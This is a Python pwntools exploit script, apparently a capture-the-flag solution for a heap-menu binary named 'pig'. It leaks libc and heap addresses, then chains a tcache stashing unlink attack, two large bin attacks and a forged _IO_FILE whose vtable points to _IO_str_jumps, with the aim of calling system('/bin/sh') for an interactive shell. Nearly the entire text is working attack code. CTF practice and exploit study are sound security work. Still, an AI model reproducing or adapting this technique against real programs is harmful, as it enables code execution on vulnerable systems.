from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
#context.terminal = ['tmux','splitw','-hp',"60"]

#p = process(["./ld.so", "./pwn"],
#            env={"LD_PRELOAD":"./libc.so"})
p = process('./pig')
libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")

recvuntil = lambda x : p.recvuntil(x)
send = lambda x : p.send(x)
sendline = lambda x : p.sendline(x)


def command(choice):
	recvuntil("Choice: ")
	sendline(str(choice))

def add(size,message):
	command(1)
	p.recvuntil("size: ")
	sendline(str(size))
	p.recvuntil("message: ")
	send(message)

def free(index):
	command(4)
	recvuntil('index: ')
	sendline(str(index))

def edit(index,message):
	command(3)
	recvuntil('index: ')
	sendline(str(index))
	recvuntil("message: ")
	send(message)
	
def show(index):
	command(2)
	recvuntil('index: ')
	sendline(str(index))
	
def change(role):
	command(5)
	if (role == 1):
		recvuntil('user:\n')
		sendline("A\x01\x95\xc9\x1c")
	if (role == 2):
		recvuntil('user:\n')
		sendline("B\x01\x87\xc3\x19")
	if (role == 3):
		recvuntil('user:\n')
		sendline("C\x01\xf7\x3c\x32")

def libc_addr():
	p.recvuntil("message is: ")
	libc_base = u64(p.recv(6).ljust(8,b'\x00')) - (0x7f57c0d2abe0-0x7f57c0b3e000)
	success("libc_base: "+hex(libc_base))
	return libc_base
def heap_addr():
	p.recvuntil("message is: ")
	heap_base = u64(p.recv(6).ljust(8,b'\x00')) - (0x55a9c79538b0-0x55a9c7941000)
	success("heap_base: "+hex(heap_base))
	return heap_base

#tcache_stashing unlink prepare
change(2)
for i in range(5):
	add(0x90,"tcache smashing prepare\n" * (0x90//48))		#role 2 4
	free(i)

change(1)
add(0x150,"tcache chunk\n"* (0x150// 48))  #0
for i in range(7):
	add(0x150,"tcache chunk\n"* (0x150// 48))
	free(i+1)

free(0)
change(2)
change(1)
show(0)    #leak libc addr
libc_base = libc_addr()
show(6)    #leak heap addr
heap_base = heap_addr()
free_hook = libc_base + libc.sym['__free_hook']
IO_str_jumps = libc_base + (0x7ffff7d76580-0x7ffff7b8d000)-32
IO_list_all = libc_base + libc.sym['_IO_list_all']
system_addr = libc_base + libc.sym['system']

change(2)
add(0xb0,"tcache stashing prepare\n" * (0xb0//48))   #split 0x160 into 0xc0 and 0xa0   ;   role2 5 ;  first small bin 0xa0

change(1)
add(0x150,"put in small bin\n"*(0x150//48))  #role 1 8
add(0x150,"unsorted chunk\n"* (0x150// 48))  #role1 9
add(0x150,"avoid merge\n"* (0x150// 48))  #role1 10   #avoid merge
free(9)
change(2)
add(0xb0,"tcache stashing prepare\n" * (0xb0//48))   #split 0x160(role 1 9) into 0xc0 and 0xa0   ;   role2 6 ;  second small bin 0xb0
change(1)
add(0x150,"put in small bin\n"*(0x150//48))  #role 1 11

#large bin attack1 -> free_hook-0x8
change(2)
add(0x430,"big unsorted\n"*(0x430//48))  #role 2 7
change(1)
add(0x150,"avoid unlink\n"*(0x150//48))  #role 1 12
change(2)
add(0x440,"large bin\n"*(0x440//48))  #role 2 8  large bin
change(1)
add(0x150,"avoid unlink\n"*(0x150//48))  #role 1 13
change(2)
add(0x450,"large bin\n"*(0x450//48))  #role 2 9  first large bin 
change(1)
add(0x150,"avoid unlink\n"*(0x150//48))  #role 1 14

change(2)
free(7)
free(9)
change(1)
add(0x150,"into largebin\n"*(0x150//48))  #role 1 15  role2's chunk9 linked into large bin
change(2)
free(8)
edit(9,(p64(0)+p64(free_hook-0x28))*(0x450//48))      #write free_hook-0x8
change(1)
add(0x150,"into largebin\n"*(0x150//48))  #role 1 16   large bin attack! Now, *(free_hook-0x8) = chunk_addr of role2-8 

#large bin attack2 -> io_list_all

add(0x150,"into unsorted\n"*(0x150//48))  #role 1 17    
change(3)
add(0x440,"large chunk\n"*(0x440//48)) #role 3 0
change(1)
free(16)
free(17)

change(3)
free(0)

change(2)
edit(9,(p64(0)+p64(IO_list_all-0x20))*(0x450//48))    #write IO_list_all
change(1)
add(0x150,"into largebin\n"*(0x150//48))  #role 1 17   large bin attack! Now, *(io_list_all) = chunk_addr of role3-0(role3-0 ==role2-8)

#tcache stashing unlink attack
fd_heap = heap_base + (0x00005608c5be4280-0x5608c5bd2000)
edit(9,(p64(fd_heap)+p64(free_hook-0x20))*(0x150//48))    #role 1 9 overlap role 2 6
change(3)
gift_addr = heap_base + (0x55d09bd30d90-0x55d09bd1d000)
payload = p64(0)*3 + p64(gift_addr) + p64(0)*2*20

add(0x440,payload) #role 3 1  #get chunk from large bin, this chunk is the value of the addr of io_list_all, then put fake_IO to fake_io_list
add(0x90,"tcache stashing\n"*(0x90//48)) #role 3 2
add(0xa0,"before gift\n"*(0x90//48)) #role 3 3
add(0xa0,"gift\n"*(0x90//48)) #role 3 3

bin_sh_addr = heap_base + (0x56048b577e70-0x56048b564000)
fake_IO_FILE = 2*p64(0) #fp->flag=0
fake_IO_FILE += p64(1)                    #change _IO_write_base = 1
fake_IO_FILE += p64(0xffffffffffff)        #change _IO_write_ptr = 0xffffffffffff
#fp->_IO_write_ptr - fp->_IO_write_base >= _IO_buf_end - _IO_buf_base
fake_IO_FILE += p64(0)
fake_IO_FILE += p64(bin_sh_addr)                #v4 _IO_buf_base
fake_IO_FILE += p64(bin_sh_addr+0x18)                #v5 _IO_buf_end
fake_IO_FILE = fake_IO_FILE.ljust(0xb0, b'\x00')
fake_IO_FILE += p64(0)                    #change _mode = 0
fake_IO_FILE = fake_IO_FILE.ljust(0xc8, b'\x00')
fake_IO_FILE += p64(IO_str_jumps)        #change vtable
payload = fake_IO_FILE + b'/bin/sh\x00' + 2*p64(system_addr)

send(payload + b'\n')
command(5)

sendline("\n")

p.interactive()